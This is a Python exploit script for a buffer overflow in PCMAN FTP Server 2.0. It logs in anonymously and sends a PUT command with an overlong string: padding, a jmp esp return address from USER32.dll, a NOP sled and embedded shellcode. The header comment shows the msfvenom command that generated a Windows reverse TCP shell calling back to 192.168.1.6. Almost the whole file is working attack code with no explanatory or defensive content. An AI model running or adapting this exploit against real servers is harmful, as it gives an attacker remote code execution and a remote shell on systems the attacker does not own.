# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in PCMAN FTP server 2.0.

# 0x7e455af7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
# badchars: \x00\x0A\x0D
# shellcode: msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.6 LPORT=4444 -b '\x00\x0A\x0D' -f python -v scode

import socket

scode =  ""
scode += "\xd9\xc2\xd9\x74\x24\xf4\xba\x48\xeb\xac\x34\x5d\x33"
scode += "\xc9\xb1\x56\x31\x55\x18\x83\xc5\x04\x03\x55\x5c\x09"
scode += "\x59\xc8\xb4\x4f\xa2\x31\x44\x30\x2a\xd4\x75\x70\x48"
scode += "\x9c\x25\x40\x1a\xf0\xc9\x2b\x4e\xe1\x5a\x59\x47\x06"
scode += "\xeb\xd4\xb1\x29\xec\x45\x81\x28\x6e\x94\xd6\x8a\x4f"
scode += "\x57\x2b\xca\x88\x8a\xc6\x9e\x41\xc0\x75\x0f\xe6\x9c"
scode += "\x45\xa4\xb4\x31\xce\x59\x0c\x33\xff\xcf\x07\x6a\xdf"
scode += "\xee\xc4\x06\x56\xe9\x09\x22\x20\x82\xf9\xd8\xb3\x42"
scode += "\x30\x20\x1f\xab\xfd\xd3\x61\xeb\x39\x0c\x14\x05\x3a"
scode += "\xb1\x2f\xd2\x41\x6d\xa5\xc1\xe1\xe6\x1d\x2e\x10\x2a"
scode += "\xfb\xa5\x1e\x87\x8f\xe2\x02\x16\x43\x99\x3e\x93\x62"
scode += "\x4e\xb7\xe7\x40\x4a\x9c\xbc\xe9\xcb\x78\x12\x15\x0b"
scode += "\x23\xcb\xb3\x47\xc9\x18\xce\x05\x85\xed\xe3\xb5\x55"
scode += "\x7a\x73\xc5\x67\x25\x2f\x41\xcb\xae\xe9\x96\x5a\xb8"
scode += "\x09\x48\xe4\xa9\xf7\x69\x14\xe3\x33\x3d\x44\x9b\x92"
scode += "\x3e\x0f\x5b\x1a\xeb\xa5\x51\x8c\xd4\x91\x67\x4a\xbd"
scode += "\xe3\x67\x43\x61\x6a\x81\x33\xc9\x3c\x1e\xf4\xb9\xfc"
scode += "\xce\x9c\xd3\xf3\x31\xbc\xdb\xde\x59\x57\x34\xb6\x32"
scode += "\xc0\xad\x93\xc9\x71\x31\x0e\xb4\xb2\xb9\xba\x48\x7c"
scode += "\x4a\xcf\x5a\x69\x2d\x2f\xa3\x6a\xd8\x2f\xc9\x6e\x4a"
scode += "\x78\x65\x6d\xab\x4e\x2a\x8e\x9e\xcd\x2d\x70\x5f\xe7"
scode += "\x46\x47\xf5\x47\x31\xa8\x19\x47\xc1\xfe\x73\x47\xa9"
scode += "\xa6\x27\x14\xcc\xa8\xfd\x09\x5d\x3d\xfe\x7b\x31\x96"
scode += "\x96\x81\x6c\xd0\x38\x7a\x5b\x62\x3e\x84\x19\x4d\xe7"
scode += "\xec\xe1\xcd\x17\xec\x8b\xcd\x47\x84\x40\xe1\x68\x64"
scode += "\xa8\x28\x21\xec\x23\xbd\x83\x8d\x34\x94\x42\x13\x34"
scode += "\x1b\x5f\xa4\x4f\x54\x60\x45\xb0\x7c\x05\x46\xb0\x80"
scode += "\x3b\x7b\x66\xb9\x49\xba\xba\xfe\x42\x89\x9f\x57\xc9"
scode += "\xf1\x8c\xa8\xd8"


evilString = "A"*2008 + "\xf7\x5a\x45\x7e" + "\x90"*100 + scode + "\x90"*2300

cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.1.4',21))
print cnct.recv(1024)
cnct.send("USER anonymous\r\n")
print cnct.recv(1024)
cnct.send("PASS anonymous\r\n")
print cnct.recv(1024)
cnct.send("PUT "+evilString+"\r\n")
print cnct.recv(1024)
cnct.close()

